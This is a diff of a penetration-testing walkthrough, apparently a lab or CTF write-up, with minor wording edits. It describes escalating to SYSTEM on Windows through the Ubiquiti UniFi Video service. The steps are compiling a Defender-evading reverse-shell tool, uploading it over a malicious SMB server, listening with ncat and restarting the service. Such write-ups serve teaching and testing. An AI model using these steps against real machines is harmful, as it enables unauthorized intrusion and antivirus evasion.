@@ -203,7 +203,7 @@ Status   Name               DisplayName
 Running  windefend          Windows Defender Service
 ```
 
-Since windows defender is running, I will be using ParanoidNinja's Prometheus tool [https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp) and simply modify the ip and port of your attacking machine. I then proceed to compile.
+Since windows defender is running, I will be using ParanoidNinja's Prometheus tool [https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp) and simply modify the ip and port of my attacking machine. I then proceed to compile.
 
 {% code overflow="wrap" %}
 ```
@@ -212,7 +212,7 @@ Since windows defender is running, I will be using ParanoidNinja's Prometheus to
 ```
 {% endcode %}
 
-With an already running malicious smb server running, I proceed to upload the file
+With an already running malicious smb server running on my attacking machine, I upload the file
 
 {% code overflow="wrap" %}
 ```
@@ -237,7 +237,7 @@ Ncat: Listening on :::443
 Ncat: Listening on 0.0.0.0:443
 ```
 
-I now stop and start the service and gain system privileges
+I now stop and start the service according to the description of the exploit and gain system privileges
 
 ```
 *Evil-WinRM* PS C:\programdata\unifi-video> Stop-Service "Ubiquiti UniFi Video"; Start-Service "Ubiquiti UniFi Video"
